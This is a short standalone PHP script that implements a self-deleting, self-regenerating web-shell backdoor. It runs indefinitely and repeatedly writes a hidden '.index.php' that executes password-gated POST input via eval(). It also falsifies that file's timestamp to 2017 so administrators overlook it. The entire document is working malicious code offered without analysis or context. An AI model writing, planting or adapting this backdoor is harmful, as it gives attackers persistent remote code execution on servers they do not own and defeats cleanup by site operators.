<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = './.index.php';
$code = '<?php if(md5($_POST["pass"])=="2b772a302b13c9955d19ca901c08f56b"){@eval($_POST[a]);} ?>';
while (1){
	file_put_contents($file,$code);
	system('touch -m -d "2017-11-12 10:10:10" .index.php');
	usleep(50000);
}
?>
